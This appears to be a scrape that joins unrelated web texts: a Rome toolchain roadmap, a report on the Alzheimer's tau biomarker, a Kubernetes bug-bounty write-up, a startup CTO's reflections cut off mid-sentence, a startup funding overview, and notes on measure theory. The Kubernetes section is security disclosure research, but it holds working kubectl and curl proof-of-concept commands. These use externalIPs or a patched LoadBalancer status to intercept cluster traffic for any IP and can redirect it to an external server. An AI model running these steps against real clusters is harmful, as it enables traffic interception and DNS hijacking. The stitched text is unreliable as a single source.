id="assist-in-migrating-from-existing-tools">Assist in migrating from existing tools <a href="#assist-in-migrating-from-existing-tools" aria-label="assist-in-migrating-from-existing-tools"></a></h3> <p>It should be easy to migrate from other tools to Rome. First we need to ensure popular configuration options from other tools are supported. Then, offer automated tools to migrate basic setups without users needing to it manually.</p> <p>This needs to be accompanied with dedicated documentation and guides that can explain the differences between the tools, why you might want to use one over the other, similar concepts, new terminology, and equivalent config options.</p> </section> <section> <h3 id="allow-users-to-extend-functionality-with-plugins">Allow users to extend functionality with plugins <a href="#allow-users-to-extend-functionality-with-plugins" aria-label="allow-users-to-extend-functionality-with-plugins"></a></h3> <p>One of the fears with Rome is creating a monoculture where it’s impossible to innovate and experiment with new ideas. While it’s extremely optimistic to think we’ll ever get into any sort of monopolistic position, not allowing extensions does stiffle innovation regardless of our market position by restricting the viability and adoption of new ideas.</p> <p>Plugins allow us to avoid supporting functionality that we might not want, while still giving users a choice. It reduces our role as an arbiter and allows new languages, non-standard JavaScript features, code conventions, and ideas that interact with Rome to be viable, receive support, and proliferate.</p> <p>We need to be extremely careful not to get into the position where Babel and Webpack are today, where they’re heavily restricted by the usage of internal APIs. We need to be able to maintain our autonomy when it comes to making architectural changes. Balancing this with a powerful plugin API will be a challenge and will likely require several iterations.</p> </section> <section> <h3 id="release-undocumented-features">Release undocumented features <a href="#release-undocumented-features" aria-label="release-undocumented-features"></a></h3> <p>Rome currently does a lot more than linting. It’s a major challenge today to market and explain Rome when so much of the project isn’t officially supported. While we strive to make each individual component of Rome competitive on it’s own, to some the biggest advantage and compelling reason for using Rome might be the reduction in dependencies.</p> <p>We should focus on releasing and maturing basic versions of all core functionality. This would increase user confidence in our architecture and show that Rome is viable as the comprehensive replacement that we want to be.</p> </section> <section> <h3 id="provide-accessible-and-comprehensive-documentation">Provide accessible and comprehensive documentation <a href="#provide-accessible-and-comprehensive-documentation" aria-label="provide-accessible-and-comprehensive-documentation"></a></h3> <p>Documentation for developer tools is generally quite obtuse and relies a lot on prerequisite knowledge. This can make it intimidating and inaccessible for developers new to the ecosystem. Further complicating that is the broad scope of what Rome is trying to do.</p> <p>We have tried to address some of this by making our documentation a single page. This makes it easy to search, and it can be read from top to bottom without needing to jump around to learn about different concepts. However as our supported features grow, it will be more difficult to use this structure without oversimplifcation and doesn’t allow different paths for different demographics.</p> <p>We need to invest in a more scalable approach for our documentation. We can offer dedicated sections that explain features like linting end-to-end without needing to introduce other components like the compiler and bundler that contain significantly more concepts and overwhelm the reader. Separate guides can be offered for new users and those already experienced with other tools to properly cater for multiple audiences.</p> </section> <section> <h3 id="regularly-release-new-versions">Regularly release new versions <a href="#regularly-release-new-versions" aria-label="regularly-release-new-versions"></a></h3> <p>One of the reasons Babel was successful is how quickly I was able to quickly fix bugs and release new versions. I would regularly have releases out within minutes of a bug report. This was critical during the early days when adoption was low. Being able to unblock users quickly would often make them more excited to use Babel even though they ran into a bug.</p> <p>Similarly, we should try and replicate this by building out our release infrastructure to allow the rapid testing and release of versions. We need to maintain momentum as the scope of supported features grow.</p> <p>We can achieve this with automated releases that can be manually triggered or deployed on a schedule. Automatic changelog generation would also take a lot of the manual work out of producing releases. Nightly releases would allow users to test experimental features and provide early feedback.</p> </section> </section> <section> <h2 id="questions-and-answers">Questions and Answers <a href="#questions-and-answers" aria-label="questions-and-answers"></a></h2> <section> <h3 id="when-will-physical-rewards-be-shipped">When will physical rewards be shipped? <a href="#when-will-physical-rewards-be-shipped" aria-label="when-will-physical-rewards-be-shipped"></a></h3> <p>We are tentatively aiming for the end of April 2021, however due to COVID delays or order volume this could be extended.

Bateman and first author Kanta Horie, PhD, a visiting scientist in Bateman’s lab, realized that specific MTBR tau species were enriched in the brains of people with Alzheimer’s disease, and that measuring levels of the species in the cerebrospinal fluid that bathes the brain might be a way to gauge how broadly the toxic tangles have spread through the brain. Previous researchers using antibodies against tau had failed to detect MTBR tau in the cerebrospinal fluid. But Horie and colleagues developed a new method based on using chemicals to purify tau out of a solution, followed by mass spectrometry.</p><p>Using this technique, Horie, Bateman and colleagues analyzed cerebrospinal fluid from 100 people in their 70s. Thirty had no cognitive impairment and no signs of Alzheimer’s; 58 had amyloid plaques with no cognitive symptoms, or with mild or moderate Alzheimer’s dementia; and 12 had cognitive impairment caused by other conditions. The researchers found that levels of a specific form — MTBR tau 243 — in the cerebrospinal fluid were elevated in the people with Alzheimer’s and that it increased the more advanced a person’s cognitive impairment and dementia were.</p><p>The researchers verified their results by following 28 members of the original group over two to nine years. Half of the participants had some degree of Alzheimer’s at the start of the study. Over time, levels of MTBR tau 243 significantly increased in the Alzheimer’s disease group, in step with a worsening of scores on tests of cognitive function.</p><figure data-orig-height="467" data-orig-width="700"><img src="https://64.media.tumblr.com/b80f5e6d9222f0044e0c36a76f464ec8/a732b01a66a4a7cb-da/s1280x1920/353cb72a4ec9acf360e43a1eb0a68bb6998b1887.jpg" data-orig-height="467" data-orig-width="700" width="700" height="467" alt="image"></figure><p><i>Image:&nbsp;Researchers at Washington University School of Medicine in St. Louis have found a novel form of the Alzheimer’s protein tau in the fluid surrounding the brain and spinal cord.

The amount of tau visible in a brain scan correlates with cognitive impairment. To see how their technique matched up to the gold standard, the researchers compared the amount of tau visible in brain scans of 35 people — 20 with Alzheimer’s and 15 without — with levels of MTBR tau 243 in the cerebrospinal fluid. MTBR tau 243 levels were highly correlated with the amount of tau identified in the brain scan, suggesting that their technique accurately measured how much tau — and therefore damage — had accumulated in the brain.</p><p>“Right now there is no biomarker that directly reflects brain tau pathology in cerebrospinal fluid or the blood,” Horie said. “What we’ve found here is that a novel form of tau, MTBR tau 243, increases continuously as tau pathology progresses. This could be a way for us to not only diagnose Alzheimer’s disease but tell where people are in the disease. We also found some specific MTBR tau species in the space between neurons in the brain, which suggests that they may be involved in spreading tau tangles from one neuron to another. That finding opens up new windows for novel therapeutics for Alzheimer’s disease based on targeting MTBR tau to stop the spread of tangles.”</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmedicine.wustl.edu%2Fnews%2Fnovel-form-of-alzheimers-protein-found-in-spinal-fluid-indicates-stage-of-the-disease%2F&amp;t=ZjQ5MDkxODRiNDVjYmQ1NzBlNzRlOTg3MjYzMDgwNjQzOWZjY2UyMCxES3V5WjNqTQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F636913398485073920%2Falzheimers-new-protein-in-spinal-fluid&amp;m=0&amp;ts=1607649140">Washington University School of Medicine</a></b></p><p><b>Full study:</b>&nbsp;“CSF tau microtubule binding region identifies tau tangle and clinical stages of Alzheimer’s disease”, <i>Brain</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1093%2Fbrain%2Fawaa373&amp;t=Njk4YzRiOGMwZjk0ZWUwMDZhMjFiNTg0NDA4YjQ3MjY1MDNkNGJjYSxES3V5WjNqTQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F636913398485073920%2Falzheimers-new-protein-in-spinal-fluid&amp;m=0&amp;ts=1607649140">https://doi.org/10.1093/brain/awaa373</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625031181195509760/new-blood-test-alzheimers">Novel blood test could greatly improve diagnosis of Alzheimer’s</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        

<p>It’s 2 weeks before the end of 2019, we are deploying a Kubernetes cluster at a client with MetalLB as LoadBalancer,
and for unknown reasons at the time, MetalLB VIP randomly stops working (in the end it was too small CPU limits but that’s not important).
As we need to have the platform in production before the end of year,
we agree with the client to put some workaround in place to temporarily replace MetalLB.</p>

<p>Instead of modifying our deployments to add <code>hostPort</code>, I got a clever idea,
why not create a new <code>Service</code> with as <code>ExternalIPs</code> the node IPs,
it would allow to get the traffic from node_x_IP:443 to the right pods and allow us
to debug MetalLB on the side.</p>

<p>We immediately applied the following manifest:</p>
<div><div><pre><code>apiVersion: v1
  kind: Service
  metadata:
    name: myapp
    namespace: anevia
spec:
  ports:
  - name: http
    port: 80
    protocol: TCP
    targetPort: 80
  - name: https
    port: 443
    protocol: TCP
    targetPort: 443
  selector:
    app: myapp
  externalIPs:
  - &lt;node_1_IP&gt;
  - &lt;node_2_IP&gt;
  ...
  - &lt;node_n_IP&gt;
</code></pre></div></div>
<p>and it immediately broke the cluster.</p>

<p>Kube-proxy IPVS adds the <code>ClusterIP</code>, <code>ExternalIP</code> and <code>LoadBalancerIP</code> to the <code>kube-ipvs0</code> interface,
so the nodes could not talk to each other anymore.</p>

<p>After fighting a bit to repair the cluster with one of my colleagues, I had a light bulb moment:
I just need to set <code>externalIPs</code> to intercept the traffic of any IP, this is NICE (MITM as a Service).</p>

<p>As I had already reported a security issue to Kubernetes (<a href="https://blog.champtar.fr/CVE-2019-9946/">CVE-2019-9946</a>),
I was invited to the private launch of Kubernetes bug bounty during the summer of 2019.
Of course the invite had expired, but I was able to get a new one quickly.</p>

<h2 id="poc">POC</h2>

<p>First create the target MITM pod</p>
<div><div><pre><code>kubectl apply -f - &lt;&lt;'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: kubeproxy-mitm
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: echoserver
  namespace: kubeproxy-mitm
spec:
  replicas: 1
  selector:
    matchLabels:
      app: echoserver
  template:
    metadata:
      labels:
        app: echoserver
    spec:
      containers:
      - image: gcr.io/google_containers/echoserver:1.10
        name: echoserver
        ports:
        - name: http
          containerPort: 8080
        - name: https
          containerPort: 8443
EOF
</code></pre></div></div>

<p>Then to perform the MITM using LoadBalancer, just replace <code>&lt;IP&gt;</code> with the IP you want to MITM</p>
<div><div><pre><code>kubectl apply -f - &lt;&lt;'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-lb
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
  selector:
    app: echoserver
  type: LoadBalancer
  loadbalancerIP: &lt;IP&gt;
EOF
kubectl proxy --port=8080 &amp;
sleep 3
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-lb/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"&lt;IP&gt;"}]}}}'
kill $!
</code></pre></div></div>

<p>Or to perform the MITM using ExternalIP, just replace <code>&lt;IP&gt;</code> with the IP you want to MITM</p>
<div><div><pre><code>kubectl apply -f - &lt;&lt;'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-externalip
  namespace: kubeproxy-mitm
spec:
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
  selector:
    app: echoserver
  type: ClusterIP
  externalIPs:
    - &lt;IP&gt;
EOF
</code></pre></div></div>

<p>You can also redirect the MITM traffic to an external server, by removing the selector of the service, and manually creating Endpoints</p>
<div><div><pre><code>kubectl apply -f - &lt;&lt;'EOF'
apiVersion: v1
kind: Endpoints
metadata:
  name: mitm-externalip
  namespace: kubeproxy-mitm
subsets:
- addresses:
  - ip: &lt;EXTERNAL SERVER IP&gt;
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
EOF
</code></pre></div></div>

<p>This also works for UDP (so DNS)</p>

<h2 id="tests">Tests</h2>

<p>To properly qualify the issue, I used 3 clusters:</p>
<ul>
  <li>CentOS 7, kubespray, K8S v1.16.3, containerd, Calico, kube-proxy iptables</li>
  <li>same except kube-proxy IPVS</li>
  <li>GKE 1.15.4-gke.22 to make it easier to reproduce the results for K8S Team</li>
</ul>

<p>I found 2 ways to man in the middle the traffic, by:
a) creating a LoadBalancer service and patching the status with the attacked IP
b) creating a ClusterIP service with ExternalIPs set to the attacked IP</p>

<p>For these 2 options, I explored:
1) MITM of IPs external to the cluster
2) MITM of ClusterIP IP
3) MITM of pod IP
4) MITM of 127.0.0.1</p>

<p>This give us the following:</p>

<p><img src="https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/tests.png" alt="test results"></p>

<p>4b is already blocked.</p>

<p>2/3/4 could all be blocked by default, as those are not valid use cases.</p>

<p>1 is expected behavior for me, I want my pods to be able to talk to ExternalIP or LoadBalancerIP.</p>

<p>Another issue seen during my tests is that you can have multiple services with the same externalIP/port</p>
<div><div><pre><code># kubectl get svc -n kubeproxy-mitm
NAME                    TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
mitm-external-eip-dns   ClusterIP      10.233.55.182   8.8.8.8       53/UDP         4m10s
mitm-external-lb-dns    LoadBalancer   10.233.35.158   8.8.8.8       53:31303/UDP   64s
</code></pre></div></div>
<div><div><pre><code># kubectl get svc -n kubeproxy-mitm
NAME                    TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
mitm-external-lb-dns1   LoadBalancer   10.233.47.145   8.8.8.8       53:31545/UDP   4m37s
mitm-external-lb-dns2   LoadBalancer   10.233.40.23    8.8.8.8       53:31556/UDP   4m37s

</code></pre></div></div>
<p>The service that gets the traffic seems to be random.</p>

  <p>There is a lot written about the importance of scaling as a founder in a fast-growing startup. Most of it focused on the CEO role. The generic advice on leadership also applies to other non-CEO roles, but I could not find a lot of content targeted to technical founders. In fact, after reading a <a href="https://twitter.com/elwatto/status/1230977002192031744?s=20" target="_blank">bunch of S-1 forms</a>, <strong>it was hard to find first-time CTOs going all the way from MVP to IPO</strong> (as opposed to founding CEOs). I found this fact really intriguing, and I wanted to dig deeper to try to understand the reasons. It was also stressing me out to some degree: <em>what if I don’t manage to scale fast enough? What does scaling even mean? I’d rather prepare before it becomes a real problem! I want to be the CTO who makes <a href="https://revenuecat.com/" target="_blank">RevenueCat</a> a public company!</em><sup>1</sup></p>

<p>Is it really much harder for non-CEO founders to scale quickly? Or perhaps it is that CEOs have a stronger support network. These could be the reasons. Or maybe I was asking the wrong question. After talking to a lot of founder CTOs, there was something clear: <strong>there is no standard definition for the CTO role</strong>, responsibilities will totally change <strong>depending on the company and the stage</strong>. At inception, the CTO is probably a glorified individual contributor, but this can escalate very quickly. Everyone’s experiences are different. Unfortunately, I don’t have the answers for other non-CEO founder roles, and maybe I don’t even have it for first-time CTOs either. However, I thought it would be a good self-awareness exercise to reflect on the things I’ve learned and how my responsibilities have changed during the first 3 years at <a href="https://revenuecat.com/" target="_blank">RevenueCat</a>.</p>

<h3 id="the-cto-vs-vp-of-engineering-dilemma">The CTO vs VP of Engineering dilemma</h3>
<p>Simplifying, we could say that the CTO role is closer to architecture and code; whereas the VPE would be in charge of processes and management. A simple analogy could be the Senior/Staff Engineer path versus the Engineering Management career path.</p>

<p>During the early days, you need a CTO to architect and coordinate a small group of ICs hacking the minimum viable product. At this stage, being a founder is extremely helpful to set the vision of the product and the engineering culture. Ideally, the CTO is a domain expert in the problem that the startup is trying to solve.</p>

<p>But what if the product becomes successful? What if you reach product-market fit? You will need to hire a lot more engineers to satisfy customer demands. That’s a great problem to have. You might get lucky and get funding, or you might even be profitable already. But a higher headcount means more polished processes. At some point, somebody will inevitably need to start wearing the VP of Engineering hat. It will happen, and it will become quite obvious as the previous (or lack of) processes start to break. You have a couple of options at this stage. The CTO can start acting as VPE, or you can hire externally. It is probably a matter of personal preference or previous management experience. But <strong>it is a totally different set of skills</strong>, which might be difficult to acquire in a hyper-growth environment. Therefore, most commonly, the VP of Engineering is <a href="https://www.saastr.com/makes-bad-cto/" target="_blank">hired externally</a>.</p>

<p>If you are a founder you have some flexibility. You might have control to decide which way you want to go. Perhaps you hate people management and want to keep using your technical skills and problem knowledge to influence the technology directly. Or maybe you want to improve your management skills. Early employees tend to be more forgiving about founder managerial flaws. They joined because they trusted the founders, believed in the vision, and know they have good intentions. In the beginning, they might even prefer you as a direct manager than an external person. But eventually, there will be several layers of management, so you better learn fast if you want to follow this path and don’t have the experience.</p>

<p>Bryan Helmig, Zapier’s co-founder and CTO, says you need to <a href="https://zapier.com/engineering/startup-cto/" target="_blank"><em>figure out where you get your dopamine hits</em></a>. Personally, I have always been more of a <em>computer person</em> than a <em>people person</em>. 
I was not sure which path I should take, but I would have bet on the one involving computers. I’ve always loved them, and I would say I am a better, more experienced engineer than I am a manager. I feel  more energized after shipping a new feature than during a one-on-one meeting.</p>

<p>However, as a founder, <strong>I get the dopamine hits when the company is doing well</strong>. When a customer recommends our product. When we hit the revenue goal. When we hire engineers that are better than me. When these engineers are happy and successfully shipping ambitious features. When code review is exhaustive but collaborative, not adversarial.</p>

<p>So, ultimately, I’ve taken the approach to not simply follow my personal preference, but to <strong>do whatever is more impactful for the company at each stage</strong>. I am a problem solver after all. That is how I have been thinking about my role. My <strong>founder identity should be more important than my CTO title</strong>. In the long run, as a major shareholder, I need to do whatever is best for the company.</p>

<p>Typically breaking points start happening <strong>somewhere between 8 and 12 engineers</strong>. But it can be different depending on the product and the environment. In our case, as a fully distributed company, we encountered several breaking points as we were adding new time zones. During this <em>no man’s land stage</em> most technical founders are temporarily forced to wear both CTO and VPE hats simultaneously. Being flexible turned out to be very advantageous. I tried to step up and (poorly and temporarily) do work that nobody had the bandwidth to do. This helped me to identify the pain points and tweak the process or hire somebody to take over these tasks.</p>

<p>One thing that helped me a lot to navigate my role was to learn how other founders were spending their time at each stage. I have been journaling since we started the company. Based on these notes, I will briefly describe the tasks I’ve been focused on and how my role has evolved.</p>

<h2 id="2018-yc-mvp-and-first-hires">2018: YC, MVP, and first hires</h2>
<p>When we did Y-Combinator it was only <a href="https://twitter.com/jeiting" target="_blank">Jacob</a> and me. Jacob would write SDK and frontend code and I would focus on the backend and infrastructure. After YC we hired our first two engineers to take over Jacob’s coding responsibilities full time. We were all based in San Francisco and these hires were people we already knew. Easy (almost inexistent) management. <strong>There was no process overhead</strong>, we had one-week sprints and <strong>we were moving really fast</strong>.</p>

<p>These days were stressful but fun. We were setting the foundations of the engineering culture and seeing customers signing up one by one. Most of my time was spent architecting the initial version of features, listening to customers, and building their requests as fast as we humanly could. <strong>We would ship most requests on the same day</strong>.</p>

<p>My biggest concern here was making sure we were building something people wanted and the ability to keep growing to justify our <a href="https://techcrunch.com/2018/10/24/revenuecat-seed-funding/" target="_blank">$1.5M seed round</a>.</p>

<p><strong>Main learnings</strong>: Too many, impossible to summarize. We learned a lot while doing Y-Combinator. The main thing would be that talking to customers, building what they want, and making them happy was paramount. We even made this and shipping fast two of our <a href="https://www.revenuecat.com/blog/values" target="_blank">core values</a>.</p>

<h2 id="2019-keeping-up-with-customers-and-scaling-the-tech">2019: Keeping up with customers and scaling the tech</h2>
<p>It looks like we had achieved some kind of product-market fit. <strong>Customers were coming to us, support tickets started piling up and our API throughput would increase every day</strong>. We added our first remote engineer, located in Taiwan. The time zone difference was hard initially and we needed to adapt processes. But it all worked out fine. We got better coverage for customer requests and monitoring.</p>

<p><strong>Onboarding was a complete, one-off manual process</strong>. I started doing one-on-ones (not very regularly, maybe once a month), but <strong>management was still pretty light</strong>. Most conversations were still very technical. I was still an individual contributor. I was also on booth duty at a couple of conferences.</p>

<figure>
  <img src="https://miguelcarranza.es/assets/posts/boothduty.JPG" alt="Booth Duty, AltConf 2019">
</figure>

<p>My main concern at this stage was purely technical: <strong>the scalability of our systems</strong>. All of our engineers had a more product-oriented background, and we had some clear single points of failure. Not going down was constantly in my mind. The scale was outgrowing my comfort zone every single day. We did a decent job optimizing the most common scenarios, <a href="https://www.revenuecat.com/blog/aurora-migration-zero-downtime" target="_blank">migrating infrastructure before reaching breaking points</a>, and <strong>paying down the technical debt we took the year before</strong>.</p>

<p>Up until Q4, I was the de-facto on-call engineer. I did not want to disturb other team members outside working hours, and I felt reliability was my ultimate responsibility as a technical founder. I would carry my laptop literally everywhere. Eventually, <strong>we implemented an on-call rotation, and in retrospect, we should have done it earlier</strong>.</p>

<p><strong>Main learnings</strong>: Do not stress over scalability, but monitor as much as possible and always look out for the next bottleneck and single point of failure. Again, these are stressful but great problems to have. Establish an on-call policy as soon as possible, train engineers, and document resolution for known incidents. Rely on your team. <a href="https://miguelcarranza.es/technical-debt" target="_blank">Technical debt is actually good</a> if taken responsibly while trying to find product-market fit.</p>

<h2 id="2020-delegation-and-planning-the-future-organization">2020: Delegation and planning the future organization</h2>
<p>In 2020 we doubled the team again. We added engineers in Europe and Latin America. By the end of the year, we had multiple members in every team (SDK, frontend, backend…). We were able to work on several projects at the same time, and finally tackle more ambitious features. But we needed more coordination. <strong>A little bit of management structure was unavoidable at this stage.</strong></p>

<p>During Q1 and Q2 I spent most of my time reviewing code, providing architectural guidance, and coding a little bit on the side. I was still the person who had more context about our systems. By mid-year, it became very obvious that I was the bottleneck for …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="sectionfunding" role="tabpanel"><div>
						<div><p>There are several ways to get funding for your Startup such as <strong>Angel Investment, Venture Capital, Accelerator funding, Government Grants, and Crowdfunding</strong>.</p>
<p>Angel Investors, Venture Capitalists, and Accelerators usually look to <strong>invest in Startup’s for an equity share</strong> when they believe the Startup has a high chance of success. Angel Investors are individuals or groups of individuals that invest their own money, whereas Venture Capitalists are employees of Venture Capital firms that invest other people’s money.</p>
<p>The difference between these two is that <strong>Angel Investors will generally want some level of control</strong> over the direction of the company although offer valuable business experience. Whereas Venture Capitalists offer the potential for large investment but typically want to take on <strong>Startup’s that can grow fast and have an exit strategy</strong> (such as IPO or acquisition) so they can get a return on their investment.</p>
<p><strong>Accelerators</strong> are a bit different to Angel Investors and Venture Capitalists in what they offer. Accelerators are usually a fixed term program that provides access to <strong>mentoring, expert advice, industry contacts, and resources in addition to funding</strong>.</p>
<p>Often Startups will start by self funding their idea until they can <strong>prove/display the need for a solution</strong> to investors. This is commonly done through <strong>creating a MVP</strong> (Minimum Viable Product) and gaining traction with users.</p>
<p>Some other ways to display the desire for a solution include <strong>creating a landing page</strong> that demonstrates what your app will do and allows interested users to signup to a mailing list for updates on the product. Or to <strong>use manual processes</strong> that replicate what a solution would do and allows users to use it in a similar way. For example, helping users plan their holidays manually to prove the need for a holiday planning app.</p>
<p><strong>Crowdfunding</strong> can be used to raise capital in cases where <strong>niche communities may highly desire a solution to a problem. </strong>Crowdfunding allows outside contributors to donate to fund development of the new product. In many crowdfunding campaigns donators money will not be taken until a significant funding milestone is hit that would allow for creation of the product. Contributors are often incentivised by the completion of the finished product, a small gift or even a credit down the line.</p>
<p>Some <strong>Australian Government Grants</strong> that are useful for Startups include <strong>MVP Grants and R&amp;D Tax Offsets</strong>. MVP Grants of up-to $25k are accessible in NSW for Startups who are pre-revenue with a proof of concept ready to test. R&amp;D Tax Offsets can be claimed by businesses for eligible R&amp;D expenditure.</p>

        <div>
            <section>
                
            </section>
            <p>This is one of the basic ideas that are commonly not understood properly, we learn
this from the high school level. Currently, most of the exploration is going
back to basics and wondering why they are defined like that. I can see that most of the
definitions have mathematical backgrounds and general theorems or axioms
present, which I'm trying to understand more now. Here I want to see what’s
the intuition behind the Random Variables.</p>
<blockquote>
<p><strong>From Wikipedia:</strong></p>
<p>A Random variable / Random Quantity/ Stochastic Variable is
described as a variable whose value depends on the outcomes of a random phenomenon.</p>
</blockquote>
<p>Definition based on Measure Theory is more intuitive,</p>
<blockquote>
<p>Random Variable isn't a variable, it's a function which maps objects to real valued line.</p>
</blockquote>
<p>The definition of a Random variable in Formal Mathematical term is defined using
Measure Theory, It seems measure theory based intuitions are easier to connect
rather than statements which define the random variable. Usually, we remember
things if we can associate them with some real-world entities or actions, which
is more intuitively we can recollect when we want to restate or understand other
similar concepts. I’m trying to wrap around this basic idea using measure
theory.</p>
<h2>Measure Theory</h2>
<p>Very generically we can say, Measure can be explained using the Set Theory from
the Wikipedia article is very apt here.</p>
<blockquote>
<p><strong>Measure on a Set is a systematic way to assign a real number to each suitable subset of a set.</strong></p>
</blockquote>
<p><strong>Measurable Events:</strong> We can group those set of events that can be measured or quantified by using some units that we are familiar with.</p>
<p><img alt="MeasureTheory" src="https://haridas.in/images/RandomVariable-Measure_theory.png"></p>
<p>Here <code>Set A</code> can be anything ( eg; all people in the world, space in physics, number of atoms in the universe ), that we are trying to understand. Power Set of <code>Set A</code> includes all elements in <code>Set A</code> as well as all combinations of items in <code>Set A</code> including the <code>null</code> item.</p>
<p>Assigning a real number to all these subsets of A is called <strong>Measuring</strong>. We can do any type of measuring activity that is possible on the <code>Set A</code> or the measuring that's important to us. For example, to understand the heights of all humans in the globe, we do Measure their height, here the measuring is finding the height of each and every person and map that to a real line with some unit.</p>
<p>I was wondering, why the Measure was defined like this, why the intermediate set ( power set of <code>A</code> ) required here ?, why note map the initial set A to the real number? What I'm able to reason here for these questions are,</p>
<ol>
<li>Power set includes the <code>set A</code> also</li>
<li>It takes care of the cases where the original set is not fully tractable or impossible to find all the items in it, so we have to measure things that are available for us, so there the subset makes sense as a framework.</li>
<li>In the case of non-discrete space eg; length, volume, temperature, etc, it's impossible to get the exact value, hence ranges are used or subsets here.</li>
</ol>
<h3>σ-algebra ( Sigma Algebra )</h3>
<p>An <code>Algebra</code> on a Set is a collection of subsets closed under Union and Intersections.</p>
<p>An <code>σ-Algebra</code> on a Set is a collection of subsets closed under countable unions and Intersections.</p>
<p>What's mean by <strong>closed</strong> is that, if we take any two items from the given set and we do the specified operation (union or intersection), the result also available in the same Set.</p>
<p>The <code>Countable</code> union or intersection means, we can associate natural numbers to the subsets of a given set, ie; a bijective nature in the mapping. Another side of it is, all the subsets are not measurable, as it wouldn't follow the constraints of σ-algebra, Hence σ-algebra is a special constraint applied on a Set to define the Measure and Measure space.</p>
<p><img alt="CountableAddictivity" src="https://haridas.in/images/Countable_additivity_of_a_measure.svg.png"></p>
<p> [Source: Wikipedia] </p>

<p>Note: Here <span>\(\mu\)</span> is a <strong>Measure</strong>.</p>
<h3>Different Types of Measures</h3>
<p>Based on some constraints applied on how we can do the measuring or what to measure we can group the Measuring to different types of measures that are common for a particular domain,</p>
<ol>
<li><strong>Borel Measure</strong>: Allocate real number to space.</li>
<li><strong>Lebesgue Measure</strong>: Standard way to measure the n-dimensional euclidean space. This measure is a more general one and used to formalize the probability space also. As in that case, the measure assigns values in the range of [0, 1].</li>
<li><strong>Counting Measure</strong>: Counts the number of items in a subset of <code>Set A</code></li>
<li>etc.</li>
</ol>
<h3>Measure Space</h3>
<p>Measure space is defined using a triplet - <span>\((X, A, \mu)\)</span>, Here</p>
<ol>
<li><span>\(X\)</span> is the Set</li>
<li><span>\(A\)</span> <span>\(\sigma\)</span>-algebra defined on the Set X, or the subset follows the constraints of <span>\(\sigma\)</span>-algebra.</li>
<li><span>\(\mu\)</span> is the measure</li>
</ol>
<p>This abstract notion helps to understand the entire Measure space and its characteristics.</p>
<ol>
<li><strong>Euclidian space</strong> - Try to measure the Length, Area, Volume, hypervolume, etc. Or more common 3-D space.</li>
<li><strong>Probability Space</strong> - In this case, the Measure of an entire Set is 1. And <code>null</code> set gets value zero -- We can say this space is an abstract space, with some special properties attached to it. This is being done by proper normalization or knowing about all subsets in the measure space.</li>
<li>etc.</li>
</ol>
<p>Probability Space also formally defined by the triplet same as above, but the elements are named differently, as,</p>
<p>Probability space triplet - <span>\((\Omega, F, P)\)</span></p>
<ol>
<li><span>\(\Omega\)</span> - All possible outcomes of an experiment or <code>Sample Space</code>,</li>
<li><span>\(F\)</span> - Subsets of <span>\(\Omega\)</span> called as <code>Event Space</code>, each subset is called an <code>event</code>. We can call the <span>\(F\)</span> set of all events from sample space.</li>
<li><span>\(P\)</span> - Probability function, which assigns a real number between [0-1] to every  <code>event</code>.</li>
</ol>
<p>Here you will be wondering how the probability function ensures the mapping is between 0-1 ?, this is being ensured by the proper normalization factor, if the sample space <span>\(\Omega\)</span> is fully tractable, then that can be used, or only approximation works there.</p>
<p>Why <span>\(P(\Omega) = 1\)</span>, this can be explained by applying the rule of <span>\(\sigma\)</span>-algebra, the functions should support, <strong>countable union</strong>,</p>
<p><span>\(P(\Omega) = P(O_1) + P(O_2) + ... + P(O_n) = 1\)</span></p>
<h2>Random Variable</h2>
<p>Now we all already covered what's Random variable multiple times above, let’s restate it here,</p>
<blockquote>
<p><strong>A random variable is not a variable but a function that maps from space to the real number domain.</strong> So we can see that Random Variable is a measure done on a specified Measure Space.</p>
</blockquote>
<p>So it's clear that we can pick, any measurable function as a random variable. Few constraints applied there are</p>
<ol>
<li>Whether that measurable function is usable to us.</li>
<li>We can do the measure on the given Space.</li>
</ol>
<p>If we are dealing with the probabilities of outcomes of an event, then we can represent this entire experiment using the <code>probability space</code> definition.</p>
<h5>Q: So what's <strong>Random</strong> in Random Variable?</h5>
<p>A: Only thing here random being important is, at measure time we shouldn't be biased on any specific type of subsets for measuring. So the <strong>process</strong> of measuring has randomness, hence we call this a random variable.</p>
<p>Let's take one example experiment, where we consider all humans as our <strong>Measure Space</strong></p>
<h2>Probability Distributions</h2>
<blockquote>
<p>From Wikipedia, Probability Distribution is a mathematical description ( or summary) of probabilities of events, subsets of the sample space. These descriptions are represented as a function.</p>
<p>Putting it in another way: Probability Distribution is a function that gives probabilities of occurrence of different possible outcomes for an Experiment.</p>
</blockquote>
<p>IMO, This idea came because, after seeing different probability spaces ( or outcomes of different experiments ) we were observed surprisingly have a common pattern. From this, we have an abstract meta function that describes the behaviors of a <strong>random variable</strong>.</p>
